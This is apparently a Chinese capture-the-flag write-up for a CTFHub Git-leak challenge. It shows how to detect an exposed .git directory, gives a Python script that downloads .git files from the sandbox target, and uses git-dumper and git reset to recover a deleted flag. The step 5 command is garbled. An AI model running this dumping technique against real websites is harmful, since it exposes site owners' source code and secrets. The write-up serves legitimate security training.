---
title: CTFHub Git泄露 Log
date: 2026-09-25
categories: CTFHub Web
tags: CTFHub Web 信息泄露 Git泄露 
---

# 题目： CTFHub Git泄露 Log

## 题目描述
点开靶场之后页面出现' Where is flag？'.网站存在git泄露，flag被开发者提交后删除，需要从git历史版本恢复flag。

## 解题思路
网站禁止直接访问/.git/目录（返回403），但可以访问/.git/HEAD，确认存在Git源码泄露。

## 解题步骤
1. 浏览器访问/.git/HEAD，出现下载任务,判断为Git泄露
2. 借助工具得出GitHack脚本
   #!/usr/bin/env python3
import os
import requests
from urllib.parse import urljoin

base_url = "http://challenge-8f29b53b95ed9641.sandbox.ctfhub.com:10000/.git/"
output_dir = "git_dump"

git_files = [
    "HEAD", "config", "description", "index",
    "COMMIT_EDITMSG", "logs/HEAD",
    "objects/info/packs", "refs/heads/master"
]

headers={"User-Agent":"Mozilla/5.0"}

def save_file(remote_path):
    full_url = urljoin(base_url, remote_path)
    local_path = os.path.join(output_dir, remote_path)
    os.makedirs(os.path.dirname(local_path), exist_ok=True)
    try:
        r = requests.get(full_url, headers=headers, timeout=8)
        if r.status_code == 200:
            with open(local_path,"wb") as f:
                f.write(r.content)
            print(f"[+]下载成功 {remote_path}")
    except Exception:
        pass

if __name__ == "__main__":
    print("开始下载git泄露文件")
    for f in git_files:
        save_file(f)
    print("下载完成！进入git_dump文件夹，执行 git log、git reset --hard")
3. 运行GitHack脚本
4. 点击文件夹进去后文件空白处shift+鼠标右键打开powershell执行pip install git-dumper直接pip安装
5. 安装完成后执行git"靶场地址/.git/"./git_out
6. 运行完后打开git_out文件夹
7. Shift+右键空白处选择Git Bash，输入git log
8. 复制添加flag的提交的commit号'git reset --hard 粘贴commit编号
9. 打开文件夹出现的flag.php,拿到flag

## 踩坑指南
1. dvcs‑ripper为Perl脚本，**无法pip install安装**，Windows环境不友好，不要使用pip安装它。
2. 靶场返回403访问`/.git/`目录，但是单个`.git/HEAD`文件可访问，确认git源码泄露。
3. git clone失败：靶场不支持git智能HTTP握手，浏览器能GET文件，但git克隆握手报错。
4. 推荐工具：git‑dumper（Python3，Windows直接pip安装）下载完整.git仓库。

## 知识点总结
1. Git源码泄露：网站把.git文件夹部署到web目录，攻击者下载仓库拿到源码与历史提交。
2. git log：查看全部版本提交日志。
3. git reset --hard 哈希值：强制回滚到指定版本，恢复已经删除的文件。
4. ### 判断Git源码泄露
   -检测payload：在url后拼接`/.git/HEAD`，若页面输出`ref: refs/heads/master`，证明存在.git源码泄露。
   -注意：访问`/.git/`目录返回403 Forbidden，只是服务器关闭目录浏览，**不能排除泄露**，只要内部文件可访问即可被利用。
   -区分：git clone失败不等于没有泄露；部分Web环境不支持Git智能HTTP握手，此时使用git‑dumper下载仓库源码。
   -其他辅助检测点：`/.git/config`、`/.git/index`，能够访问则确认泄露。
